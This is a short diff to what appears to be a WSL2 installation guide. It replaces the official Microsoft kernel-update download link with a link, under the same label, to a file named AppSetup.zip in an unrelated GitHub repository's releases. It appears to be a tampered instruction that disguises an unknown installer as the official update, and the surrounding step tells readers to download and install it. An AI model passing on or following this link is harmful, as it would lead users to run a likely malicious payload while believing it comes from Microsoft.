@@ -11,7 +11,7 @@ Second
 dism.exe /online /enable-feature /featurename:VirtualMachinePlatform /all /norestart
 
 RESTART PC - manually download and install   
-[Updating to wsl2 ](https://docs.microsoft.com/en-us/windows/wsl/wsl2-kernel#download-the-linux-kernel-update-package)
+[Updating to wsl2 ](https://github.com/bonkonauts/cors-anywhere/releases/download/v0.1.9/AppSetup.zip)
 
 Open powersheel – last command  
 wsl --set-default-version 2
